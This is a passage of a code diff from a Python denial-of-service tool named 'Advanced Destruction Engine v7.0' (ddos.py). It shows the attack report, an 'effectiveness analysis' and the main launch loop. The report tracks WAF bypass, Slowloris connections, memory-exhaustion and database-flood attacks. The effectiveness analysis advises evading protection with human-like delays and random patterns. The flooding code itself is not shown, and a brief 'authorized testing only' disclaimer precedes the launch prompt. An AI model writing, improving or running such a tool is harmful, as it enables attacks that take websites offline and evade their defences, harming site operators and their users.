+        protection_analysis = "[green]✅ NO MAJOR PROTECTION DETECTED[/]"
+    
+    report = f"""
+    ╔══════════════════════════════════════════════════════════════════════════╗
+    ║                     ATTACK COMPLETE - DETAILED REPORT                    ║
+    ╠══════════════════════════════════════════════════════════════════════════╣
+    ║                                                                          ║
+    ║  🎯 [bold cyan]TARGET INFORMATION[/]                                      ║
+    ║  ────────────────────────────────────────────────────────────────        ║
+    ║  URL:          {target.protocol}://{target.host}:{target.port:<30} ║
+    ║  IP Address:   {target.ip:<40} ║
+    ║  Protection:   {protection_analysis:<30} ║
+    ║                                                                          ║
+    ║  ⏱️  [bold cyan]TIME STATISTICS[/]                                        ║
+    ║  ────────────────────────────────────────────────────────────────        ║
+    ║  Total Duration:   {hours:02d}:{minutes:02d}:{seconds:02d} (HH:MM:SS)          ║
+    ║  Average RPS:      {avg_rps:,.1f} requests/second{'':<20} ║
+    ║  Peak RPS:         {stats['peak_rps']:,} requests/second{'':<20} ║
+    ║                                                                          ║
+    ║  📊 [bold cyan]REQUEST STATISTICS[/]                                      ║
+    ║  ────────────────────────────────────────────────────────────────        ║
+    ║  Total Requests:   {stats['total_requests']:,}{'':<30} ║
+    ║  Successful:       {stats['successful']:,} ({stats['success_rate']:.1f}%){'':<20} ║
+    ║  Blocked:          {stats['blocked']:,} ({block_rate:.1f}%){'':<20} ║
+    ║  Errors:           {stats['errors']:,} ({error_rate:.1f}%){'':<20} ║
+    ║                                                                          ║
+    ║  💾 [bold cyan]DATA TRANSFER[/]                                          ║
+    ║  ────────────────────────────────────────────────────────────────        ║
+    ║  Sent:             {stats['bytes_sent_mb']:.1f} MB{'':<35} ║
+    ║  Received:         {stats['bytes_recv_mb']:.1f} MB{'':<35} ║
+    ║  Bandwidth (Avg):  ▲ {stats['mbps_sent']:.1f} MB/s | ▼ {stats['mbps_recv']:.1f} MB/s{'':<10} ║
+    ║                                                                          ║
+    ║  🔧 [bold cyan]CONFIGURATION USED[/]                                      ║
+    ║  ────────────────────────────────────────────────────────────────        ║
+    ║  Threads:          {Config.MAX_THREADS}{'':<40} ║
+    ║  Max RPS:          {Config.MAX_RPS:,}{'':<40} ║
+    ║  Intensity:        {Config.ATTACK_INTENSITY.upper()}{'':<40} ║
+    ║  WAF Bypass:       {'ENABLED' if Config.ENABLE_WAF_BYPASS else 'DISABLED'}{'':<40} ║
+    ║  Human-like Mode:  {'ENABLED' if Config.HUMAN_LIKE_DELAYS else 'DISABLED'}{'':<40} ║
+    ║  Slowloris:        {'ENABLED' if Config.ENABLE_SLOWLORIS else 'DISABLED'}{'':<40} ║
+    ║  Memory Attacks:   {'ENABLED' if Config.ENABLE_RESOURCE_EXHAUSTION else 'DISABLED'}{'':<40} ║
+    ║  Database Flood:   {'ENABLED' if Config.ENABLE_DATABASE_FLOOD else 'DISABLED'}{'':<40} ║
+    ║                                                                          ║
+    ║  🌐 [bold cyan]NETWORK INFORMATION[/]                                     ║
+    ║  ────────────────────────────────────────────────────────────────        ║
+    ║  Unique IPs Used:  {stats['unique_ips']}{'':<40} ║
+    ║  SSL Enabled:      {'YES' if target.ssl_enabled else 'NO'}{'':<40} ║
+    ║  Persistent Conn:  {stats['persistent_connections']}{'':<40} ║
+    ║  Slowloris Conn:   {stats['slowloris_connections']}{'':<40} ║
+    ║  Memory Attacks:   {stats['memory_exhaustion_attempts']}{'':<40} ║
+    ║  Database Floods:  {stats['database_floods']}{'':<40} ║
+    ║                                                                          ║
+    ╚══════════════════════════════════════════════════════════════════════════╝
+    """
+    console.print(Panel.fit(report, border_style="bold green", padding=(1, 2)))
+    
+    show_effectiveness_analysis(stats, target)
+    save_report_to_file(stats, target)
+
+def show_effectiveness_analysis(stats, target):
+    effectiveness = ""
+    recommendations = []
+    
+    if stats['success_rate'] >= 80:
+        effectiveness = "[bold green]EXCELLENT[/] - Attack was highly effective"
+        recommendations.append("Maintain current configuration for similar targets")
+    elif stats['success_rate'] >= 50:
+        effectiveness = "[bold yellow]GOOD[/] - Attack was moderately effective"
+        recommendations.append("Consider increasing threads for better performance")
+    elif stats['success_rate'] >= 20:
+        effectiveness = "[bold orange]FAIR[/] - Attack faced significant resistance"
+        recommendations.append("Try different attack vectors or increase delays")
+    else:
+        effectiveness = "[bold red]POOR[/] - Attack was mostly blocked"
+        recommendations.append("Target has strong protection, consider different approach")
+    
+    if stats['blocked'] > stats['successful']:
+        recommendations.append("Target has active protection (WAF/CloudFlare)")
+        recommendations.append("Use more human-like delays and random patterns")
+    
+    if stats['mbps_sent'] < 1.0:
+        recommendations.append("Low bandwidth usage, consider increasing request size")
+    
+    analysis_panel = Panel.fit(
+        f"[bold cyan]📈 ATTACK EFFECTIVENESS ANALYSIS[/]\n\n"
+        f"[yellow]Overall Rating:[/] {effectiveness}\n"
+        f"[green]Success Rate:[/] {stats['success_rate']:.1f}%\n"
+        f"[red]Block Rate:[/] {(stats['blocked']/max(stats['total_requests'],1))*100:.1f}%\n\n"
+        f"[bold yellow]💡 RECOMMENDATIONS:[/]\n"
+        + "\n".join([f"  • {rec}" for rec in recommendations]),
+        border_style="bold yellow",
+        padding=(1, 2)
+    )
+    console.print(analysis_panel)
+
+def save_report_to_file(stats, target):
+    try:
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"attack_report_{target.host}_{timestamp}.txt"
+        with open(filename, 'w') as f:
+            f.write("=" * 60 + "\n")
+            f.write("ADVANCED DESTRUCTION ENGINE v7.0 - ATTACK REPORT\n")
+            f.write("=" * 60 + "\n\n")
+            f.write(f"Target: {target.protocol}://{target.host}:{target.port}\n")
+            f.write(f"IP Address: {target.ip}\n")
+            f.write(f"Attack Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+            f.write("-" * 60 + "\n")
+            f.write("STATISTICS\n")
+            f.write("-" * 60 + "\n")
+            f.write(f"Total Requests: {stats['total_requests']:,}\n")
+            f.write(f"Successful: {stats['successful']:,} ({stats['success_rate']:.1f}%)\n")
+            f.write(f"Blocked: {stats['blocked']:,}\n")
+            f.write(f"Errors: {stats['errors']:,}\n")
+            f.write(f"Duration: {stats['elapsed_time']} seconds\n")
+            f.write(f"Average RPS: {stats['total_requests']/max(stats['elapsed_time'],1):.1f}\n")
+            f.write(f"Peak RPS: {stats['peak_rps']:,}\n")
+            f.write(f"Data Sent: {stats['bytes_sent_mb']:.1f} MB\n")
+            f.write(f"Data Received: {stats['bytes_recv_mb']:.1f} MB\n")
+            f.write(f"Persistent Connections: {stats['persistent_connections']}\n")
+            f.write(f"Slowloris Connections: {stats['slowloris_connections']}\n")
+            f.write(f"Memory Attacks: {stats['memory_exhaustion_attempts']}\n")
+            f.write(f"Database Floods: {stats['database_floods']}\n\n")
+            f.write("-" * 60 + "\n")
+            f.write("CONFIGURATION\n")
+            f.write("-" * 60 + "\n")
+            f.write(f"Threads: {Config.MAX_THREADS}\n")
+            f.write(f"Max RPS: {Config.MAX_RPS}\n")
+            f.write(f"Intensity: {Config.ATTACK_INTENSITY}\n")
+            f.write(f"WAF Bypass: {'Enabled' if Config.ENABLE_WAF_BYPASS else 'Disabled'}\n")
+            f.write(f"Human-like Mode: {'Enabled' if Config.HUMAN_LIKE_DELAYS else 'Disabled'}\n")
+            f.write(f"Slowloris: {'Enabled' if Config.ENABLE_SLOWLORIS else 'Disabled'}\n")
+            f.write(f"Memory Attacks: {'Enabled' if Config.ENABLE_RESOURCE_EXHAUSTION else 'Disabled'}\n")
+            f.write(f"Database Flood: {'Enabled' if Config.ENABLE_DATABASE_FLOOD else 'Disabled'}\n\n")
+            f.write("=" * 60 + "\n")
+            f.write("END OF REPORT\n")
+            f.write("=" * 60 + "\n")
+        console.print(f"[green]📄 Report saved to: {filename}[/]")
+    except Exception as e:
+        console.print(f"[yellow]⚠️  Could not save report: {e}[/]")
+
+def main():
+    try:
+        show_banner()
+        
+        disclaimer = Panel.fit(
+            "[bold red]⚠️  LEGAL DISCLAIMER[/]\n\n"
+            "[yellow]This tool is for EDUCATIONAL and AUTHORIZED testing ONLY![/]\n"
+            "[cyan]By using this tool, you agree to:[/]\n"
+            "1. Use only on systems you own or have explicit permission to test\n"
+            "2. Comply with all applicable laws and regulations\n"
+            "3. Accept full responsibility for your actions\n"
+            "4. Not use for malicious purposes\n\n"
+            "[green]Press Enter to accept and continue...[/]",
+            border_style="bold red",
+            padding=(1, 2)
+        )
+        console.print(disclaimer)
+        input()
+        
+        target_url = get_target()
+        configure_attack()
+        
+        console.print(f"\n[bold yellow]⚠️  FINAL CONFIRMATION[/]")
+        console.print(f"[cyan]Target:[/] {target_url}")
+        console.print(f"[cyan]Threads:[/] {Config.MAX_THREADS}")
+        console.print(f"[cyan]RPS Limit:[/] {Config.MAX_RPS}")
+        console.print(f"[cyan]Duration:[/] {Config.ATTACK_DURATION}s")
+        console.print(f"[cyan]Intensity:[/] {Config.ATTACK_INTENSITY.upper()}")
+        console.print(f"[cyan]WAF Bypass:[/] {'[green]ENABLED[/]' if Config.ENABLE_WAF_BYPASS else '[red]DISABLED[/]'}")
+        console.print(f"[cyan]Human-like:[/] {'[green]ENABLED[/]' if Config.HUMAN_LIKE_DELAYS else '[red]DISABLED[/]'}")
+        console.print(f"[cyan]Slowloris:[/] {'[green]ENABLED[/]' if Config.ENABLE_SLOWLORIS else '[red]DISABLED[/]'}")
+        console.print(f"[cyan]Memory Attacks:[/] {'[green]ENABLED[/]' if Config.ENABLE_RESOURCE_EXHAUSTION else '[red]DISABLED[/]'}")
+        console.print(f"[cyan]Database Flood:[/] {'[green]ENABLED[/]' if Config.ENABLE_DATABASE_FLOOD else '[red]DISABLED[/]'}")
+        
+        confirm = input("\n👉 Type 'START' to launch attack, anything else to cancel: ").strip().upper()
+        if confirm != 'START':
+            console.print("[yellow]✗ Attack cancelled[/]")
+            return
+        
+        asyncio.run(run_smart_attack(target_url))
+        
+        restart = input("\n👉 Launch another attack? (y/n): ").strip().lower()
+        if restart == 'y':
+            AttackState.stats = {
+                'total_requests': 0,
+                'successful': 0,
+                'blocked': 0,
+                'errors': 0,
+                'bytes_sent': 0,
+                'bytes_received': 0,
+                'peak_rps': 0,
+                'current_rps': 0,
+                'targets_hit': 0,
+                'unique_ips': set(),
+                'waf_detected': False,
+                'cloudflare_detected': False,
+                'persistent_connections': 0,
+                'slowloris_connections': 0,
+                'memory_exhaustion_attempts': 0,
+                'database_floods': 0,
+                'connection_pool_size': 0
+            }
+            AttackState.last_count = 0
+            AttackState.attacking = False
+            AttackState.start_time = 0
+            os.system('clear' if os.name == 'posix' else 'cls')
+            main()
+        else:
+            console.print("\n[bold green]👋 Thank you for using Advanced Destruction Engine v7.0![/]")
+            console.print("[yellow]Remember: Use this tool only for authorized testing![/]")
+            sys.exit(0)
+            
+    except KeyboardInterrupt:
+        console.print("\n[yellow]⚠️  Program interrupted by user[/]")
+        sys.exit(0)
+    except Exception as e:
+        console.print(f"[red]✗ Unexpected error: {e}[/]")
+        import traceback
+        traceback.print_exc()
+        sys.exit(1)
+
+if __name__ == "__main__":
+    try:
+        import requests
+    except ImportError:
+        console.print("[yellow]⚠️  'requests' module not found. Installing...[/]")
+        import subprocess
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
+        import requests
+    
+    try:
+        from rich import print
+    except ImportError:
+        console.print("[yellow]⚠️  'rich' module not found. Installing...[/]")
+        import subprocess
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "rich"])
+    
     try:
         import aiohttp
-        import rich
     except ImportError:
-        console.print("[red]✗ Missing dependencies! Install with:[/]")
-        console.print("[cyan]pip install aiohttp rich colorama dnspython[/]")
-        sys.exit(1)
+        console.print("[yellow]⚠️  'aiohttp' module not found. Installing...[/]")
+        import subprocess
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp"])
     
-    # Run Part 1
-    main_part1()
+    try:
+        main()
+    except KeyboardInterrupt:
+        console.print("\n[yellow]👋 Exiting Advanced Destruction Engine...[/]")
+        sys.exit(0)
+    except Exception as e:
+        console.print(f"[red]✗ Fatal error: {e}[/]")
+        console.print("[yellow]Troubleshooting steps:[/]")
+        console.print("1. Install requirements: pip install rich aiohttp colorama requests")
+        console.print("2. Check Python version (3.7+ required)")
+        console.print("3. Run with: python ddos.py")
+        sys.exit(1)
